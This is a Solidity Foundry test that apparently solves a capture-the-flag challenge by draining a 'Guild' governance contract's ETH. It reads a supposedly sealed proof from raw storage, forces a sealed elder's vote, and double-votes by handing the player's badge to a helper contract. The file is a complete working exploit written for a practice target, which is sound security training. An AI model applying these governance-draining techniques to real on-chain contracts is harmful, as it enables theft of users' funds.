// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import "forge-std/Test.sol";
import {IOverseer} from "targets/overseer/src/interfaces/IOverseer.sol";
import {Overseer} from "targets/overseer/src/Overseer.sol";
import {Guild} from "targets/overseer/src/Guild.sol";
import {SealedTurncloak} from "targets/overseer/src/elders/SealedTurncloak.sol";
import {Loyalist} from "targets/overseer/src/elders/Loyalist.sol";
import {helper} from "src/overseer/VoteHelper.sol";

// Was: imported Challenge.sol but its internal src/ imports don't resolve from our root
// Fix: replicate Challenge's setup inline (it just deploys + wires contracts)

contract OverseerAttackTest is Test {
    // --- CTF contracts ---
    Overseer overseer;
    Guild guild;
    SealedTurncloak turncloak;
    Loyalist loyalist;

    // --- Attack contracts ---
    helper h;

    // --- Player = this test contract ---
    // Was: tried using EOA as player — but in a test, address(this) is the caller
    // The test contract IS the player, IS an elder, HAS a badge

    function setUp() public {
        // Was: imported Challenge.sol but its src/ imports break from our root
        // Fix: replicate what Challenge constructor does — deploy + wire contracts
        address player = address(this);

        // 1. Deploy Overseer (registers itself + player as badge holders)
        overseer = new Overseer(player);

        // 2. Deploy elders
        turncloak = new SealedTurncloak(IOverseer(address(overseer)));
        loyalist = new Loyalist(IOverseer(address(overseer)), 0xf5930c6AC61D6bdD2cB8d3312beBe506DEab78Cc);

        // 3. Deploy Guild with 3 initial elders
        address[] memory initialElders = new address[](3);
        initialElders[0] = address(turncloak);
        initialElders[1] = address(loyalist);
        initialElders[2] = player;

        guild = new Guild(
            player,
            IOverseer(address(overseer)),
            Guild.CouncilRules({verdictThreshold: 3, duration: 15}),
            initialElders
        );

        // 4. Wire guild to elders
        turncloak.setGuild(address(guild));
        loyalist.setGuild(address(guild));

        // 5. Fund guild with 10 ETH (same as Challenge)
        (bool ok,) = address(guild).call{value: 10 ether}("");
        require(ok);
    }

    function test_attack() public {
        bytes16 playerBadge = overseer.folkToBadge(address(this));
        bytes16 guildBadge = guild.badge();

        console.log("=== RECON ===");
        console.log("Player (this):", address(this));
        console.log("Guild balance:", address(guild).balance);
        console.log("Total elders:", guild.totalElders());

        // --- Read SealedTurncloak _proof from storage slot 0 ---
        // Was: tried slot 0, but `layout at 10` shifts ALL storage (including inherited _proof)
        // SealedVault._proof lands at slot 10, not slot 0
        uint256 proof = uint256(vm.load(address(turncloak), bytes32(uint256(10))));
        console.log("Proof:", proof);

        // --- Deploy helper for the 3rd vote ---
        h = new helper(guild, IOverseer(address(overseer)));

        // --- STEP 1: Propose decree to drain all ETH to us ---
        bytes16 decreeId = "1234567891234567";
        {
            Guild.Edict[] memory edicts = new Guild.Edict[](1);
            edicts[0].to = address(this);         // send ETH here
            edicts[0].value = address(guild).balance; // all of it
            edicts[0].data = "";                   // plain transfer

            bytes memory proposeData = abi.encode(decreeId, edicts);

            overseer.oversee(
                playerBadge,
                guildBadge,
                keccak256("DECREE_PROPOSED"),
                bytes32(decreeId),
                proposeData
            );
            console.log("Decree proposed");
        }

        // --- STEP 2: Player votes Aye (1/3) ---
        overseer.oversee(
            playerBadge,
            guildBadge,
            keccak256("DECREE_VOTED"),
            bytes32(decreeId),
            abi.encode(decreeId, uint8(1)) // 1 = Aye
        );
        console.log("Player voted Aye (1/3)");

        // --- STEP 3: SealedTurncloak votes Aye via unseal (2/3) ---
        // Was: tried vote=2 (Nay). Fix: 1 = Aye
        turncloak.unseal(decreeId, 1, proof);
        console.log("SealedTurncloak voted Aye (2/3)");

        // --- STEP 4: Transfer player badge to helper ---
        overseer.proposeBadgeChange(address(h));
        console.log("Badge transfer proposed");

        // --- STEP 5: Helper accepts badge + votes Aye (3/3) ---
        h.help(decreeId, playerBadge);
        console.log("Helper voted Aye (3/3)");

        // --- STEP 6: Advance blocks past the voting duration ---
        // Was: needed --slow with BlockBurner to mine blocks one by one
        // Fix: in a test, vm.roll() advances block.number instantly
        vm.roll(block.number + 16);
        console.log("Advanced 16 blocks");

        // --- STEP 7: Re-enroll (old badge transferred) and enact ---
        bytes16 newBadge = overseer.enroll();

        overseer.oversee(
            newBadge,
            guildBadge,
            keccak256("DECREE_ENACTED"),
            bytes32(decreeId),
            abi.encode(decreeId)
        );

        // --- VERIFY ---
        // Was: challenge.isSolved() — but we don't have Challenge.sol imported
        // Fix: check directly — isSolved() just checks guild.balance == 0
        console.log("=== RESULT ===");
        console.log("Guild balance:", address(guild).balance);
        console.log("Solved?", address(guild).balance == 0);

        assertEq(address(guild).balance, 0, "Guild still has ETH!");
    }

    // Need receive() to accept the drained ETH
    receive() external payable {}
}
